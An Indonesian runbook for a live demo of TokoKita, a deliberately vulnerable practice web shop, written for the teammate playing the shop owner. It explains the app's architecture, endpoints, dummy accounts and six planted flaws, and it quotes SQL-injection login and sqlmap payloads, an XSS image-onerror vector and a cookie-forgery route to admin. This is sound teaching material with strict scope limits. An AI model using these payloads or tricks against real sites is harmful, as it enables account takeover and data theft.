# Runbook TokoKita — Panduan Demo untuk Kamu (Edisi Lengkap)

> **Dokumen ini dibuat khusus untuk Kamu, pemeran pemilik toko.**
> Kamu tidak perlu punya latar belakang keamanan siber. Dokumen ini menjelaskan proyek TokoKita **dari ujung ke ujung, selengkap mungkin**: apa itu TokoKita, bagaimana cara kerjanya di dalam, siapa saja akunnya, data apa saja yang ada, celah apa saja yang sengaja dibuat, bagaimana tiap adegan demo dijalankan langkah demi langkah, alat apa yang dipakai dan kenapa, apa risikonya, dan apa yang harus dilakukan sebelum, selama, dan sesudah presentasi.
>
> Kalau ada istilah yang belum paham, cari di Bagian 3 (Istilah). Kalau ada angka atau urutan yang berbeda di dokumen lain, yang berlaku adalah dokumen ini.

| Angka resmi demo | Keterangan |
| --- | --- |
| **6 kategori** | SQL Injection, Stored XSS, Sesi Lemah, Harga dari Client, IDOR, Upload |
| **7 adegan** | SQL Injection tampil dua kali: login dan lab sqlmap |
| **12 menit** | Durasi rundown resmi, dari pembuka sampai reset |
| **12 akun demo** | 1 admin (Kamu) + 11 pembeli |
| **42 produk katalog** | 8 kategori, harga dan stok ada di browser |
| **5 pesanan seed** | #101, #102 (Rohandhika), #201 (Kamu), #202, #203 (Sari) |
| **4 produk lab** | Hanya untuk latihan sqlmap, di database terpisah |

> [!WARNING]
> **Satu angka, satu urutan.** Kalau ada dokumen lain yang menyebut jumlah atau urutan berbeda, yang berlaku adalah dokumen ini: **6 kategori, 7 adegan**, dengan rundown **harga → IDOR → SQLi login → sqlmap → XSS → upload → mitigasi dan reset**.

---

## Baca ini sebelum demo — yang paling penting

**TokoKita adalah aplikasi latihan yang sengaja dibuat rentan.** Artinya, Pelaku (yang membuat proyek ini) sengaja menulis kode yang salah di beberapa tempat, supaya di presentasi bisa ditunjukkan: "lihat, kalau kode ditulis begini, ini yang bisa terjadi". Ini bukan aplikasi toko sungguhan, dan bukan aplikasi yang sudah dibobol orang lain. Semua kelemahannya sudah diketahui sejak awal, sudah direncanakan, dan hanya boleh ditunjukkan dalam presentasi yang sudah disepakati.

**Pengujian hanya boleh menyasar aplikasi TokoKita yang menjadi target demo.**

- Jangan menguji Railway, server atau edge hosting, jaringan kampus, akun, atau sistem pihak lain.
- Jangan gunakan data pribadi, password asli, atau akun yang dipakai di layanan lain.
- Jangan menarasikan demo ini sebagai "membobol Railway". Ceritanya adalah menemukan kesalahan pada logika aplikasi TokoKita.
- Semua username, password, pesanan, dan produk pada seed adalah data dummy (data contoh yang dibuat-buat, bukan data orang sungguhan).

**Aplikasi ini publik selama masa demo.** Celah stored XSS dapat berjalan di browser siapa pun yang membuka ulasan berbahaya sebelum dibersihkan. Karena itu, jalankan presentasi dalam jendela waktu yang disepakati, gunakan akun dan browser demo, lalu segera reset data setelah adegan. Pemilik proyek bertanggung jawab mematikan deployment setelah presentasi.

**Peran di panggung:**

- **Kamu** — pemilik TokoKita. Kamu berperan sebagai pemilik toko yang mengira alur toko berjalan normal. Kamu tidak perlu mengetik payload, tidak perlu mengoperasikan Burp, sqlmap, atau Nmap. Tugasmu: menunjukkan sisi pemilik (login, lihat dashboard, buka halaman produk), bereaksi dengan kata-katamu sendiri atas apa yang ditunjukkan Pelaku, dan berkata "stop" kapan saja kalau ada yang terasa tidak aman.
- **Pelaku** — penguji yang mendapat izin dari pemilik. Pelaku yang mengoperasikan semua alat pengujian, mengetik payload, dan menunjukkan request/response. Pelaku yang membuat proyek ini, jadi Pelaku yang paling paham isi kodenya.
- **Audiens** — melihat dua laptop/proyektor: Kamu menunjukkan sisi pemilik; Pelaku menunjukkan bagaimana request aplikasi dapat diuji.

Kalimat pembuka yang bisa digunakan:

> "Saya pemilik TokoKita. Pelaku menguji aplikasi demo ini dengan izin saya. Semua akun dan data dibuat khusus untuk latihan. Pengujian hanya mencakup aplikasi TokoKita, bukan layanan hosting atau sistem lain."

---

## 1. Apa itu TokoKita? Proyek ini dari ujung ke ujung

### 1.1 Cerita toko (yang dilihat pengunjung)

TokoKita adalah toko online (marketplace kecil) berbahasa Indonesia. Pengunjung bisa:

1. Membuka halaman utama dan melihat katalog produk, mencari produk, dan memfilter berdasarkan kategori.
2. Membuka detail satu produk, membaca deskripsi, harga, rating, stok, dan ulasan pembeli lain.
3. Menambahkan produk ke keranjang, mengubah jumlah, lalu checkout (membuat pesanan).
4. Mendaftar akun baru, login, logout, melihat profil, dan melihat riwayat pesanan sendiri.
5. Melacak pesanan dengan memasukkan nomor pesanan.
6. Mengunggah file dari halaman profil.
7. Kalau login sebagai penjual (admin), membuka Dashboard Penjual: melihat semua pesanan, mengubah nama toko, mengubah harga produk, dan mereset data demo.

Di permukaan, semuanya terlihat seperti toko online biasa: ada hero produk (Headphone Sony WH-1000XM5, Rp4.299.000), gratis ongkir di atas Rp500.000, pengiriman 1–3 hari kerja, retur 7 hari, pembayaran aman, COD tersedia, kurir JNE, SiCepat, dan AnterAja. Semua itu adalah cerita toko. Di baliknya, kode toko ini sengaja ditulis dengan kesalahan-kesalahan yang akan didemokan.

### 1.2 Teknologi yang dipakai (sederhana, tanpa framework berat)

- **Frontend:** HTML, CSS, dan JavaScript polos (tanpa framework). File `index.html` dan folder `pages/`, `css/`, `assets/`.
- **Backend:** Python standar saja (Python 3.10+, tanpa library tambahan — lihat `requirements.txt`: "Tidak ada dependency eksternal; server.py hanya memakai Python stdlib"). Satu file utama: `server.py`, memakai `http.server` bawaan Python dan SQLite bawaan Python.
- **Database:** SQLite, dua file:
  - `tokokita.db` — data utama aplikasi (akun, pesanan, ulasan, pengaturan toko, harga override).
  - `tokokita-lab.db` — database terpisah, hanya berisi empat produk dummy untuk latihan sqlmap. Tidak ada akun, pesanan, atau ulasan di sini.
- **Hosting demo:** Railway. File `Procfile` berisi `web: python3 server.py --host 0.0.0.0 --port $PORT`. URL publik demo: `https://tokokita-web-production.up.railway.app`. Railway hanya penyedia hosting — **infrastruktur Railway bukan bagian dari target**.
- **Menjalankan lokal:**
  ```bash
  python3 server.py
  ```
  Buka `http://127.0.0.1:8000`. Tidak perlu install apa pun. Ganti port: `python3 server.py --port 8080`. Untuk demo dua laptop di jaringan privat tim saja: `python3 server.py --host 0.0.0.0`, lalu akses `http://<IP-laptop-kamu>:8000`. Jangan expose port ini ke jaringan publik.
- **Reset data demo lokal:** hentikan server, hapus `tokokita.db`, `tokokita-lab.db`, dan isi `uploads/`, lalu jalankan ulang. Database seed akan dibuat ulang otomatis.
- **Tes otomatis:** `python3 tests/smoke_test.py` — menyalakan server sendiri di port 8765 dengan database sementara, menguji semua celah demo, lalu mematikannya lagi. Tes ini tidak menyentuh `tokokita.db` milik demo.

### 1.3 Struktur proyek — setiap file dan fungsinya

```
tokokita-web/
├── index.html                 # Halaman utama: hero, pencarian, katalog 42 produk
├── pages/
│   ├── login.html             # Halaman masuk
│   ├── register.html          # Halaman daftar akun baru
│   ├── product.html           # Detail satu produk + ulasan
│   ├── cart.html              # Keranjang belanja
│   ├── checkout.html          # Halaman pembayaran (checkout)
│   ├── orders.html            # Riwayat pesanan + lacak pesanan
│   ├── profile.html           # Profil + upload file
│   ├── seller.html            # Dashboard Penjual (khusus admin)
│   └── info.html              # Halaman info: bantuan, tentang, retur, privasi, karier, jual, syarat
├── css/style.css              # Semua tampilan toko
├── assets/product-1.jpg … product-6.jpg   # Foto asli 6 produk pertama
├── js/
│   ├── data.js                # Katalog 42 produk + 8 kategori + halaman info (di browser)
│   ├── auth.js                # Login, register, logout, pemulihan sesi
│   └── app.js                 # Katalog, ulasan, pencarian, keranjang, checkout,
│                              #   pesanan, profil, upload, dashboard penjual
├── server.py                  # Backend: API, sesi, database, static files, skenario rentan
├── tests/smoke_test.py         # Tes otomatis semua celah demo
├── docs/
│   ├── runbook.md             # Dokumen ini — panduan untuk Kamu
│   └── demo-runbook.md        # Panduan teknis untuk Pelaku (Burp, sqlmap, Nmap, langkah detail)
├── README.md                  # Ringkasan aplikasi dan cara menjalankan
├── SPEC-public-pentest-demo.md # Spesifikasi demo: tujuan, cakupan, batas keamanan, kriteria sukses
├── CAPABILITY-MAP.md          # Peta modul: sqlmap-lab, burp-lab, nmap-scope, demo-guide
├── tasks/plan.md, tasks/todo.md   # Rencana dan daftar tugas pembangunan demo
├── Procfile                   # Perintah Railway untuk menjalankan server
├── requirements.txt           # Tidak ada dependency eksternal
├── .gitignore                 # Yang tidak di-commit: __pycache__/, *.pyc,
│                              #   tokokita.db, tokokita-lab.db, uploads/, mitm_mcp_traffic.db
└── uploads/                   # Hasil unggahan (dibuat otomatis saat server jalan)
```

Penjelasan per bagian, supaya Kamu paham mana yang apa:

- **`index.html`, `pages/`, `css/`, `assets/`** — semua yang dilihat pengunjung: halaman dan tampilan toko. Tidak ada logika keamanan di sini; halaman hanya menampilkan apa yang dikirim server dan apa yang ada di `js/data.js`.
- **`js/data.js`** — katalog produk ada di sini, di browser (bukan di server). Ada 42 produk dan 8 kategori: Semua, Elektronik, Fashion, Rumah, Olahraga, Aksesoris, Kecantikan, Dapur. Enam produk pertama punya foto asli (`assets/product-1.jpg` sampai `product-6.jpg`); sisanya memakai ilustrasi SVG. Setiap produk punya id, nama, toko, kota, harga, harga coret, jumlah terjual, rating, dan stok. Penting: karena katalog ada di browser, harga yang tampil di halaman **bukan** harga yang dipercaya server — dan di situlah celah harga checkout berasal (lihat Bagian 5, Kategori 3). Keranjang belanja juga disimpan di browser (`localStorage`, kunci `tokokita_cart`), bukan di server.
- **`js/auth.js`** — alur login, register, logout, dan pemulihan sesi. Login mengirim `identifier` (username atau email) dan `password` ke `POST /api/login`. Setelah login, browser menyimpan objek user di memori saja; sesi sebenarnya disimpan di server (lihat Bagian 2).
- **`js/app.js`** — semua logika toko di browser: menampilkan katalog, detail produk, ulasan, pencarian, keranjang, checkout, pesanan, profil, upload, dan dashboard penjual. Dua baris di file ini penting untuk demo:
  - Ulasan dirender dengan `innerHTML` tanpa escape (`renderReviews`): teks ulasan dimasukkan langsung sebagai HTML. Inilah yang membuat stored XSS bisa berjalan.
  - Checkout mengambil harga dari hidden input `priceField<id>` di halaman dan mengirimkannya ke server (`doCheckout`). Inilah yang membuat harga bisa diubah dari browser.
- **`server.py`** — otak toko. Satu file Python (±800 baris) yang berisi: semua API (`/api/login`, `/api/checkout`, `/api/orders/...`, dan lain-lain), manajemen sesi, pembuatan dan pengisian database, penyajian file statis, dan semua skenario rentan yang sengaja dibuat. Setiap celah di file ini diberi komentar `SENGAJA` di kodenya, supaya jelas itu disengaja, bukan ketidaksengajaan. Server juga mengirim header palsu `Apache/2.4.41` dan `X-Powered-By: PHP/7.4.3` supaya hasil `nmap`/`curl` terlihat seperti aplikasi PHP lama — padahal backend sebenarnya Python stdlib. Ini banner simulasi, bukan bukti stack aslinya.
- **`tokokita.db` dan `tokokita-lab.db`** — database SQLite yang dibuat otomatis saat server pertama kali jalan (fungsi `init_db` dan `init_lab_db` di `server.py`). File-file ini tidak di-commit ke Git (ada di `.gitignore`); yang di-commit hanya kodenya, dan datanya dibuat ulang dari seed di `server.py` setiap kali database dihapus dan server dijalankan ulang.
- **`tests/smoke_test.py`** — tes otomatis. Menyalakan server di port 8765 dengan database sementara, lalu memeriksa: 12 akun demo tersedia; SQLi login menjadi admin; SQLi lab mengembalikan 4 fixture dan menolak input di atas 4096 karakter; cookie `PHPSESSID` tanpa `HttpOnly`; IDOR pesanan #201 milik Kamu bisa dibaca akun Rohandhika; checkout harga client total Rp100; penjual bisa ubah harga dan pembeli tidak bisa (403); reset mengembalikan harga; ulasan XSS tersimpan mentah; collector menolak cookie pembeli dan menerima cookie admin demo, menolak cookie terlalu panjang; upload `.php` diterima dan shell hanya simulasi; halaman utama tersaji; `server.py` dan file `.db` tidak ikut tersaji (404).

### 1.4 Cara kerja dari hulu ke hilir (alur satu request)

Bayangkan Kamu membuka toko di browser. Ini yang terjadi, langkah demi langkah:

1. Pengguna membuka halaman HTML toko (`index.html` atau salah satu halaman di `pages/`).
2. Browser memuat CSS (`css/style.css`), JavaScript (`js/data.js`, `js/auth.js`, `js/app.js`), dan gambar produk (`assets/`).
3. JavaScript di browser mengirim request ke API Python yang berjalan di server (`server.py`), misalnya `GET /api/me` untuk memeriksa siapa yang sedang login, `GET /api/reviews?pid=1` untuk mengambil ulasan produk 1, atau `POST /api/login` untuk login.
4. Server membaca atau menulis database SQLite (`tokokita.db` atau `tokokita-lab.db`) dan mengirim response JSON.
5. Browser menampilkan hasilnya di halaman.

Contoh konkret — membuka halaman produk Laptop ASUS Vivobook 14:

- Browser membuka `pages/product.html?id=1`.
- `js/app.js` (`renderProductDetail`) mencari produk id 1 di `PRODUCTS` (dari `js/data.js`): nama, harga Rp8.999.000, stok 14, toko LaptopKita, Jakarta.
- `js/app.js` (`renderReviews`) meminta `GET /api/reviews?pid=1` ke server.
- Server mengambil ulasan produk 1 dari tabel `reviews` di `tokokita.db` dan mengembalikannya sebagai JSON.
- Browser menampilkan ulasan itu — dan di sinilah masalahnya: ulasan ditampilkan dengan `innerHTML` tanpa escape, jadi kalau ulasan berisi kode HTML/JavaScript, browser menjalankannya sebagai kode (stored XSS, Bagian 5 Kategori 2).

Contoh lain — checkout:

- Keranjang ada di browser (`localStorage`). Saat bayar, `js/app.js` (`doCheckout`) membaca harga dari hidden input di halaman checkout, lalu mengirim `POST /api/checkout` dengan daftar item berisi `id`, `name`, `price`, dan `qty`.
- Server (`api_checkout` di `server.py`) **memakai angka `price` dari request apa adanya** untuk menghitung total, tanpa memeriksa harga asli di database. Jadi kalau harga diubah di browser menjadi 100, totalnya menjadi Rp100.

Pelajaran besar dari seluruh demo, yang akan diulang di penutup presentasi: **keputusan penting harus dilakukan di server, bukan dipercaya dari browser.** Browser dikendalikan pengguna; apa pun yang dikirim browser (harga, ID pesanan, isi ulasan, cookie) bisa diubah pengguna.


## 2. Di dalam server — database, sesi, dan semua endpoint

Bagian ini menjelaskan isi perut TokoKita. Kamu tidak perlu menghafalnya, tapi kalau audiens bertanya "datanya disimpan di mana?" atau "sesi itu apa?", jawabannya ada di sini.

### 2.1 Tabel database utama (`tokokita.db`)

| Tabel | Kolom | Isi |
| --- | --- | --- |
| `users` | id, username, password, role, label, email | 12 akun seed. Password disimpan **plaintext** (apa adanya, tanpa hashing) — lihat temuan audit di Bagian 6. `role` hanya `admin` (Kamu) atau `user` (11 pembeli). |
| `orders` | id, owner, item, total, name, addr, phone, status | 5 pesanan seed (lihat Bagian 4) + pesanan baru dari checkout (id mulai 301). |
| `reviews` | id, pid, author, text, created | Ulasan per produk. Seed: 2 ulasan untuk produk 1. Teks disimpan mentah, tanpa escape. |
| `settings` | key, value | Satu baris: `store_name` = "TokoKita Official Store". Bisa diubah admin lewat dashboard. |
| `product_prices` | product_id, price | Harga override yang diubah penjual lewat dashboard. Kosong saat seed; diisi kalau admin mengubah harga. |

Tabel database lab (`tokokita-lab.db`):

| Tabel | Kolom | Isi |
| --- | --- | --- |
| `lab_products` | id, name, category, description | Tepat 4 produk dummy: (1) Demo Laptop A — electronics, (2) Demo Mouse B — electronics, (3) Demo Book C — books, (4) Demo Mug D — home. Semuanya berlabel "Fixture sintetis untuk latihan SQLi." |

### 2.2 Sesi dan cookie — bagaimana server mengenali siapa yang login

Saat login berhasil, server membuat token sesi acak (`secrets.token_hex(16)`, 32 karakter heksadesimal) dan menyimpannya di memori server (`SESSIONS`, kamus token → username). Sesi disimpan di memori, bukan di database: **restart server = semua orang harus login ulang.**

Server mengirim dua cookie ke browser:

| Cookie | Isi | Perlindungan |
| --- | --- | --- |
| `PHPSESSID` | Token sesi acak | **Sengaja tanpa `HttpOnly`** — JavaScript di halaman bisa membacanya. Inilah yang membuat pencurian cookie lewat XSS bisa terjadi. |
| `user` | Username, misalnya `[username-admin]` | Tanpa perlindungan apa pun, dan — ini yang paling penting — **dipercaya begitu saja sebagai identitas**. |

Cara server menentukan siapa yang sedang login (`current_user` di `server.py`):

1. Baca cookie `PHPSESSID`, cari token itu di `SESSIONS`. Kalau ketemu, itulah usernamenya.
2. Kalau tidak ketemu, baca cookie `user` dan **percaya begitu saja** — tanpa memeriksa token apa pun. Jadi siapa pun yang menulis `user=[username-admin]` di cookienya langsung dianggap Kamu, admin, tanpa password, tanpa XSS, tanpa mencuri apa pun. Ini temuan audit B di Bagian 6, dan ini lebih parah daripada pencurian cookie lewat XSS.
3. Kalau dua-duanya tidak ada, pengguna dianggap belum login.

Logout menghapus token dari `SESSIONS` dan mengosongkan kedua cookie.

Selain itu, server juga mengirim header `X-Robots-Tag: noindex, nofollow` di setiap response, supaya mesin pencari tidak mengindeks situs demo ini.

### 2.3 Semua endpoint — daftar lengkap

Ini daftar semua alamat (route) di aplikasi, supaya Kamu tahu persis apa yang ada dan mana yang rentan. "Endpoint" artinya satu alamat yang melakukan satu pekerjaan.

| Method | Path | Keterangan | Perlu login? | Rentan? |
| --- | --- | --- | --- | --- |
| POST | `/api/login` | Login dengan username/email + password | Tidak | **Ya — SQLi** (Kategori 1) |
| POST | `/api/register` | Daftar akun baru (nama, email, password min. 6 karakter) | Tidak | Tidak (tapi password disimpan plaintext) |
| POST | `/api/logout` | Hapus sesi | Tidak | Tidak |
| GET | `/api/me` | Siapa user yang sedang login | Tidak (balik `null` kalau belum login) | Tidak |
| GET | `/api/reviews?pid=1` | Ambil ulasan satu produk | Tidak | Data mentah untuk XSS |
| POST | `/api/reviews` | Simpan ulasan baru (mentah) | Tidak | **Ya — Stored XSS** (Kategori 2) |
| POST | `/api/checkout` | Buat pesanan dari keranjang | **Tidak** | **Ya — harga dari client** (Kategori 3) |
| GET | `/api/orders/mine` | Pesanan milik sendiri (dicek berdasarkan user login) | Ya | Tidak — ini endpoint yang benar |
| GET | `/api/orders/<id>` | Ambil satu pesanan berdasarkan ID | **Tidak** | **Ya — IDOR** (Kategori 5) |
| GET | `/api/seller/summary` | Admin: semua pesanan + jumlah ulasan + nama toko | Ya, admin | Tidak (dicek role admin, kalau bukan admin 403) |
| GET | `/api/prices` | Harga override dari penjual | Tidak | Tidak |
| POST | `/api/seller/price` | Admin: ubah harga produk (tersimpan) | Ya, admin | Tidak (pembeli dapat 403) |
| POST | `/api/seller/store` | Admin: ubah nama toko | Ya, admin | Tidak (pembeli dapat 403) |
| POST | `/api/seller/reset` | Admin: pulihkan data seed | Ya, admin | Tidak — tapi lihat Bagian 10 soal apa yang tidak di-reset |
| POST | `/api/upload?name=...` | Unggah file | **Tidak** | **Ya — tanpa validasi** (Kategori 6) |
| GET | `/uploads/<nama-file>` | Ambil file yang diunggah; kalau `.php`, tampilkan shell simulasi | Tidak | Simulasi, bukan RCE |
| GET | `/api/lab/search?category=...` | Cari produk lab (sqlmap) | Tidak | **Ya — SQLi lab** (Kategori 1, adegan kedua) |
| GET | `/api/collect?c=...` | Penampung cookie XSS (balik GIF 1×1) | Tidak | Hanya terima `user=[username-admin]`, maks 1024 karakter, maks 50 entri |
| GET | `/collector` | Halaman "laptop penyerang": daftar cookie yang masuk | Tidak | Menampilkan cookie dengan escape HTML |

Yang **tidak** disajikan server (sengaja diblokir, 404):

- File `.py` dan `.db` apa pun, termasuk `server.py` dan `tokokita.db` — jadi pengunjung tidak bisa mengunduh kode server atau database lewat browser.
- Folder `/tasks/`, `/tests/`, dan `/.git`.

### 2.4 Halaman-halaman toko

| Halaman | Yang bisa dilakukan pengunjung |
| --- | --- |
| `index.html` (Beranda) | Lihat hero produk, cari produk, filter 8 kategori, lihat katalog 42 produk, tambah ke keranjang |
| `pages/product.html?id=...` | Lihat detail produk, baca dan kirim ulasan |
| `pages/cart.html` | Lihat keranjang, ubah jumlah produk |
| `pages/checkout.html` | Lihat rincian pembayaran, bayar (membuat pesanan) |
| `pages/orders.html` | Lihat pesanan sendiri (kalau login), lacak pesanan dengan nomor |
| `pages/login.html` | Masuk dengan username/email + password |
| `pages/register.html` | Daftar akun baru |
| `pages/profile.html` | Lihat profil, unggah file |
| `pages/seller.html` | Dashboard Penjual (khusus admin): semua pesanan, ubah nama toko, ubah harga, reset |
| `pages/info.html?page=...` | Bantuan, Tentang TokoKita, Retur, Privasi, Karier, Mulai Berjualan, Syarat & Ketentuan |

---

## 3. Istilah dasar tanpa jargon

| Istilah | Penjelasan sederhana | Contoh di TokoKita |
| --- | --- | --- |
| Browser / client | Aplikasi di laptop pengguna (Chrome, Firefox). Ia mengirim halaman, formulir, harga, dan request ke server. Apa pun yang ada di browser bisa diubah pengguna. | Harga di hidden input checkout bisa diubah lewat DevTools. |
| Server | Program yang menerima request dan menentukan jawaban. Keputusan penting seharusnya dilakukan di sini. | `server.py` (Python) yang berjalan di laptop Pelaku atau di Railway. |
| Request | Pesan yang dikirim browser ke server, misalnya "login" atau "buat pesanan". Isinya: method (GET/POST), alamat (path), header, cookie, dan body (data). | `POST /api/login` dengan body `{"identifier": "[username-admin]", "password": "..."}`. |
| Response | Jawaban server: halaman, status HTTP, atau data JSON. | `{"ok": true, "user": {"username": "[username-admin]", "role": "admin"}}`. |
| Database | Tempat server menyimpan akun, pesanan, ulasan, dan pengaturan. | SQLite `tokokita.db` dan `tokokita-lab.db`. |
| Tabel | Bagian di dalam database, seperti lembar di spreadsheet. | Tabel `users`, `orders`, `reviews`. |
| Query / SQL | Pertanyaan yang diajukan program ke database, ditulis dalam bahasa SQL. | `SELECT username FROM users WHERE username = '[username-admin]'`. |
| Cookie | Nilai kecil yang browser kirim kembali ke situs untuk mengenali sesi login. Perlakukan token sesi seperti kunci sementara. | `PHPSESSID` (token sesi) dan `user` (username). |
| Sesi | Keadaan "sudah login" yang diingat server lewat token. | Token di `SESSIONS` (memori server); restart server = login ulang. |
| Payload | Input uji yang sengaja dibuat untuk menunjukkan apakah aplikasi menangani masukan dengan aman. | `' OR '1'='1` di kolom username. |
| Endpoint / route | Alamat tertentu di aplikasi yang melakukan satu pekerjaan. | `/api/login`, `/api/checkout`, `/api/orders/201`. |
| Fixture | Data contoh yang disiapkan khusus untuk latihan, bukan data pengguna sungguhan. | 12 akun, 5 pesanan, 4 produk lab. |
| Reset | Memulihkan sebagian data toko ke kondisi seed awal. Tidak semua reset menghapus file upload. | `POST /api/seller/reset` (lihat Bagian 10). |
| Seed | Data awal yang dimasukkan otomatis saat database dibuat. | 12 akun, 5 pesanan, 2 ulasan, nama toko awal. |
| Burp Suite | Alat untuk melihat, menangkap, mengubah, dan mengulang request HTTP. Tab Repeater mengulang satu request dengan perubahan kecil. | Dipakai Pelaku untuk SQLi login dan ubah harga checkout. |
| sqlmap | Alat otomatis yang memeriksa apakah satu parameter rentan SQL injection, dengan mengirim banyak request uji. | Hanya untuk `/api/lab/search`, hanya lokal. |
| Nmap | Alat untuk mengenali service/port yang terbuka di satu komputer. | Hanya `nmap -sV -p 8000 127.0.0.1` (laptop sendiri). |
| DevTools | Perkakas bawaan browser (F12) untuk melihat HTML, nilai form, cookie, dan traffic jaringan. | Mengubah `priceField1` menjadi 100. |
| curl | Perintah terminal untuk mengirim satu request HTTP sederhana. | `curl 'http://127.0.0.1:8000/api/lab/search?category=electronics'`. |
| XSS (Cross-Site Scripting) | Situs menampilkan konten pengguna sebagai kode, sehingga browser menjalankan JavaScript kiriman pengguna seolah-olah dari situs itu. | Ulasan berisi `<img onerror=...>` yang berjalan saat halaman produk dibuka. |
| Stored XSS | XSS yang tersimpan di database, jadi berjalan setiap kali ada yang membuka halaman itu. | Ulasan berbahaya tersimpan di tabel `reviews`. |
| SQL Injection (SQLi) | Input pengguna ditempelkan langsung ke query SQL, sehingga input itu mengubah arti query. | Username `' OR '1'='1` membuat syarat login selalu benar. |
| IDOR | Aplikasi menerima ID object (misalnya nomor pesanan) tapi tidak memeriksa apakah yang meminta memang pemilik object itu. | `GET /api/orders/201` dibaca akun lain. |
| RCE | Remote Code Execution — penyerang menjalankan perintah di server. **Tidak ada di demo ini.** | Shell upload hanya simulasi, output hardcode. |
| HttpOnly | Perlindungan cookie supaya JavaScript di halaman tidak bisa membaca cookie itu. | `PHPSESSID` sengaja **tanpa** HttpOnly. |
| Banner | Teks yang dikirim server untuk memperkenalkan dirinya (nama software, versi). | `Apache/2.4.41` + `PHP/7.4.3` — palsu, backend sebenarnya Python. |
| Railway | Layanan hosting tempat demo publik dijalankan. Bukan target pengujian. | `tokokita-web-production.up.railway.app`. |

Kode status HTTP yang mungkin terlihat di Burp/log:

| Kode | Arti |
| ---: | --- |
| `200` | Request diproses berhasil. |
| `304` | Browser memakai aset yang sudah di-cache; bukan kegagalan. |
| `400` | Request atau payload tidak cocok, atau input ditolak. |
| `401` | Belum terautentikasi atau kredensial salah. |
| `403` | Identitas tidak punya izin (misalnya pembeli mencoba akses admin). |
| `404` | Route atau record tidak ditemukan, atau sengaja disembunyikan. |
| `500` | Server gagal memproses request; pada demo login, ini bisa muncul bersama detail error SQL — lihat Bagian 6 temuan C. |

Bar merah pada Railway logs tidak otomatis berarti error; lihat status HTTP dan isi pesannya.

---

## 4. Data dan akun demo — selengkapnya

### 4.1 Dua belas akun seed

Semua akun adalah sintetis (buatan, bukan orang sungguhan). Password hanya untuk lab — jangan gunakan di email, akun pribadi, atau layanan lain.

> **Catatan:** di dokumen ini, username dan password persisnya ditulis sebagai `[username-admin]`, `[password-admin]`, `[username-pelaku]`, dan `[password-pelaku]` — nilai persis yang dipakai saat demo ada di `server.py` bagian `SEED_USERS` dan di `docs/demo-runbook.md`.

| # | Username | Password | Role | Nama label | Email |
| ---: | --- | --- | --- | --- | --- |
| 1 | `[username-admin]` | `[password-admin]` | admin | Kamu | [email-admin] |
| 2 | `rohandhika` | `rohandhika123` | user | Rohandhika | rohandhika@tokokita.id |
| 3 | `sari` | `sari123` | user | Sari Dewi | sari@tokokita.id |
| 4 | `[username-pelaku]` | `[password-pelaku]` | user | Pelaku | [email-pelaku] |
| 5 | `budi` | `budi12345` | user | Budi Santoso | budi@tokokita.id |
| 6 | `maya` | `maya12345` | user | Maya Putri | maya@tokokita.id |
| 7 | `dimas` | `dimas12345` | user | Dimas Saputra | dimas@tokokita.id |
| 8 | `nina` | `nina12345` | user | Nina Permata | nina@tokokita.id |
| 9 | `raka` | `raka12345` | user | Raka Wijaya | raka@tokokita.id |
| 10 | `lila` | `lila12345` | user | Lila Ananda | lila@tokokita.id |
| 11 | `fajar` | `fajar12345` | user | Fajar Maulana | fajar@tokokita.id |
| 12 | `dewi` | `dewi12345` | user | Dewi Lestari | dewi@tokokita.id |

Akun dummy tambahan (selain tiga akun utama) terutama untuk latihan login dan kontrol akses. Mereka tidak otomatis memiliki pesanan masing-masing — pesanan seed hanya lima, lihat di bawah. Akun baru juga bisa dibuat lewat halaman register: nama, email, dan password minimal 6 karakter. Username dibuat otomatis dari bagian sebelum `@` pada email, dan kalau sudah dipakai, ditambah angka (misalnya `sari2`). Akun yang baru didaftar langsung login dan rolenya selalu `user`, tidak pernah admin.

### 4.2 Lima pesanan seed

| ID | Pemilik (owner) | Barang | Total | Nama penerima | Alamat | Telepon | Status |
| ---: | --- | --- | --- | --- | --- | --- | --- |
| #101 | rohandhika | Keyboard Mechanical RGB Hot-Swap 75% | Rp749.000 | Rohandhika | Jl. Sudirman No. 12, Medan | 0813-xxxx-2210 | Sedang Dikirim |
| #102 | rohandhika | Tas Ransel Laptop Anti Air 15,6 Inci | Rp349.000 | Rohandhika | Jl. Sudirman No. 12, Medan | 0813-xxxx-2210 | Selesai |
| #201 | kamu | Laptop ASUS Vivobook 14 (stok toko) | Rp8.999.000 | Kamu | Jl. Merdeka No. 45, Medan | 0812-xxxx-8899 | Selesai |
| #202 | sari | Headphone Sony WH-1000XM5 | Rp4.299.000 | Sari Dewi | Jl. Gatot Subroto No. 8, Medan | 0821-xxxx-3345 | Dikemas |
| #203 | sari | Sepatu Running AirFlex Putih | Rp899.000 | Sari Dewi | Jl. Gatot Subroto No. 8, Medan | 0821-xxxx-3345 | Selesai |

Semua alamat dan nomor telepon di atas adalah data contoh yang sengaja disamarkan (nomor tengahnya `xxxx`), bukan data sungguhan. Pesanan baru dari checkout mendapat ID mulai 301 ke atas (301, 302, dan seterusnya), pemiliknya adalah user yang checkout (atau "tamu" kalau tidak login), alamatnya ditulis "Alamat sesuai profil", teleponnya "-", dan status awalnya "Dikemas".

### 4.3 Ulasan seed dan produk lab

Ulasan seed (produk 1, Laptop ASUS Vivobook 14):

1. **Sari** — "Barangnya original, pengiriman cepat. Recommended seller!"
2. **Rohandhika** — "Laptopnya kencang buat kuliah dan editing ringan. Baterai awet seharian."

Produk lab (`tokokita-lab.db`, hanya untuk sqlmap):

| ID | Nama | Kategori | Keterangan |
| ---: | --- | --- | --- |
| 1 | Demo Laptop A | electronics | Fixture sintetis untuk latihan SQLi. |
| 2 | Demo Mouse B | electronics | Fixture sintetis untuk latihan SQLi. |
| 3 | Demo Book C | books | Fixture sintetis untuk latihan SQLi. |
| 4 | Demo Mug D | home | Fixture sintetis untuk latihan SQLi. |

Kalau dicari dengan `category=electronics`, hasilnya 2 produk (Laptop A dan Mouse B). Kalau dicari dengan payload SQLi `electronics' OR '1'='1' -- `, hasilnya tepat 4 produk — ini bukti cepat untuk audiens bahwa query-nya memang bisa diubah.

### 4.4 Katalog toko (42 produk, di browser)

Katalog bukan data server — katalog ada di `js/data.js`, di browser. Ada 42 produk dalam 8 kategori. Beberapa contoh yang dipakai di demo:

| ID | Produk | Harga | Toko / kota |
| ---: | --- | --- | --- |
| 1 | Laptop ASUS Vivobook 14 — Ryzen 5 / RAM 16GB / SSD 512GB | Rp8.999.000 | LaptopKita, Jakarta |
| 2 | Smartphone Samsung Galaxy A55 5G — 8GB / 256GB | Rp5.499.000 | GadgetCell, Bandung |
| 3 | Headphone Sony WH-1000XM5 Wireless Noise Cancelling | Rp4.299.000 | AudioHub, Surabaya |
